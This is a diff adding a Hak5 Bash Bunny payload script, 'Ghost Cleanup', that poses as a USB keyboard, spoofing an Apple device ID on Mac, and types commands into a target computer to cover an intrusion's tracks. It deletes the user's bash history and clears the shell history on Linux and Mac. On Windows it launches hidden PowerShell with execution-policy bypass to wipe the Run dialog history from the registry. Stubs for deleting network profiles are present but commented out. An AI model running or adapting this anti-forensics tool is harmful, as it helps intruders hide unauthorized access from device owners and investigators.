@@ -1,0 +1,222 @@
+#!/bin/bash
+#
+# Title:         Ghost Cleanup
+# Author:        bg-wa
+# Version:       0.1
+# Target:        Windows, Mac, Unity
+# Props:         Hak5
+#
+# Cleans the input history on Windows, Mac and Unity
+#
+
+LED R G
+
+
+
+#+++ USER CONFIG +++
+
+LINES=0 # EXACT NUMBER OF LINES TO REMOVE FROM HISTORY - DEFAULT : 0 = ALL
+OS="UNITY" # OPTIONS: "UNITY", "MAC", OR "WINDOWS"
+
+UNMOUNT=false
+REMOVE_NETWORKS=false
+
+DEBUG=false
+
+# SEARCH FOR 'INSERT CUSTOM' TO ADD MORE CODE IN THE PROPER PLACE, PER OS
+
+#+++ END USER CONFIG +++
+
+
+
+# GHOST CLEANUP
+#
+
+# DEBUG
+DEBUG_FILE="/dev/null/"
+if [ "${DEBUG}" = "true" ]; then
+    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
+    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
+      mkdir /root/udisk/loot
+      mkdir /root/udisk/loot/ghost_cleanup
+    fi
+    touch "${DEBUG_FILE}"
+    echo "DEBUG STARTED" >> "${DEBUG_FILE}"
+fi
+# END DEBUG
+
+
+# PLATFORM CHECK
+# FOR DYNAMIC SWITCHING, CREATE FILE '/root/udisk/loot/ghost_cleanup/os_windows' IN YOUR FIRST PAYLOAD.
+if [ -f "/root/udisk/loot/ghost_cleanup/os_windows" ]; then
+    OS="WINDOWS"
+fi
+if [ -f "/root/udisk/loot/ghost_cleanup/os_mac" ]; then
+    OS="MAC"
+fi
+if [ -f "/root/udisk/loot/ghost_cleanup/os_unity" ]; then
+    OS="UNITY"
+fi
+echo "${OS}" >> "${DEBUG_FILE}"
+# END PLATFORM CHECK
+
+
+# INIT FUNCTIONS
+init_keyboard()
+{
+    if [ -z "$1" ]; then
+        KEYBOARD="ATTACKMODE HID"
+    else
+        if [ "$1" = "MAC" ]; then
+            KEYBOARD="ATTACKMODE HID VID_0X05AC PID_0X021E"
+        else
+            KEYBOARD="ATTACKMODE HID"
+         fi
+    fi
+    echo "${KEYBOARD}" >> "${DEBUG_FILE}"
+    ${KEYBOARD}
+    QUACK DELAY 500
+}
+
+clear_active_input()
+{
+    QUACK DELAY 50
+    QUACK BACKSPACE
+    QUACK DELAY 100
+}
+
+wait_enter_wait()
+{
+    if [ -z "$1" ]; then
+        BEFORE_WAIT=100
+    else
+        BEFORE_WAIT=$1
+    fi
+    if [ -z "$2" ]; then
+        AFTER_WAIT=100
+    else
+        AFTER_WAIT=$2
+    fi
+    echo "${BEFORE_WAIT}" >> "${DEBUG_FILE}"
+    echo "${AFTER_WAIT}" >> "${DEBUG_FILE}"
+
+    QUACK DELAY ${BEFORE_WAIT}
+    QUACK ENTER
+    QUACK DELAY ${AFTER_WAIT}
+}
+
+clear_history_from_terminal()
+{
+    if [ "$LINES" -gt "0" ]; then
+        QUACK STRING head -n -$LINES \$HOME/.bash_history
+        wait_enter_wait
+        QUACK STRING history -c
+        wait_enter_wait
+    else
+        QUACK STRING rm \$HOME/.bash_history
+        wait_enter_wait
+        QUACK STRING history -c
+        wait_enter_wait
+    fi
+    echo "HISTORY CLEARED FROM TERMINAL" >> "${DEBUG_FILE}"
+}
+
+clear_history_from_powershell()
+{
+    if [ "$LINES" -gt "0" ]; then
+        # TODO: THIS CURRENTLY DELETES ALL HISTORY, IT SHOULD JUST REMOVE THE SPECIFIED NUMBER OF LINES
+        # https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/smb_exfiltrator/payload.txt
+         QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+         wait_enter_wait
+    else
+    # https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/smb_exfiltrator/payload.txt
+     QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+     wait_enter_wait
+    fi
+    echo "HISTORY CLEARED FROM POWERSHELL" >> "${DEBUG_FILE}"
+}
+
+unmount_drive_from_mac()
+{
+    # QUACK STRING diskutil unmount /Volumes/BashBunny
+    # if lines > 0; lines + 1
+    1=1
+}
+
+remove_windows_network_adapters()
+{
+    1=1
+    # QUACK STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
+
+    # REMOVE EXTRA ETHERNET CONNECTIONS
+    # QUACK STRING netsh show profiles
+    # todo ADAPTER=Get last ethernet adapter
+    # QUACK STRING netsh delete profile interface= $ADAPTER
+}
+
+echo "FUNCTIONS LOADED" >> "${DEBUG_FILE}"
+# END FUNCTIONS
+
+
+
+# START CLEANUP
+#UNITY
+if [ "${OS}" = "UNITY" ]; then
+    LED R B 100
+    init_keyboard
+    QUACK GUI
+    clear_active_input
+    QUACK STRING terminal
+    wait_enter_wait 1000 2000
+
+    #++ INSERT CUSTOM UNITY CLEANUP HERE ++
+
+
+    #++ END CUSTOM UNITY CLEANUP
+
+    clear_history_from_terminal
+    QUACK STRING exit
+    wait_enter_wait
+fi
+
+
+#MAC
+if [ "${OS}" = "MAC" ]; then
+    init_keyboard "${OS}"
+    LED R B G 100
+    QUACK GUI SPACE
+    clear_active_input
+    QUACK STRING terminal
+    wait_enter_wait 200 1000
+
+    #++ INSERT CUSTOM MAC CLEANUP HERE ++
+
+
+    #++ END CUSTOM MAC CLEANUP
+    unmount_drive_from_mac
+    clear_history_from_terminal
+    QUACK STRING exit
+    wait_enter_wait
+    QUACK GUI q
+fi
+
+
+#Windows
+if [ "${OS}" = "WINDOWS" ]; then
+    init_keyboard
+    LED B 100
+    QUACK GUI r
+    QUACK DELAY 500
+
+    #++ INSERT CUSTOM WINDOWS CLEANUP HERE ++
+
+
+    #++ END CUSTOM WINDOWS CLEANUP
+
+    clear_history_from_powershell
+    QUACK STRING exit
+    wait_enter_wait
+fi
+
+LED G
+# CLEANUP FINISHED
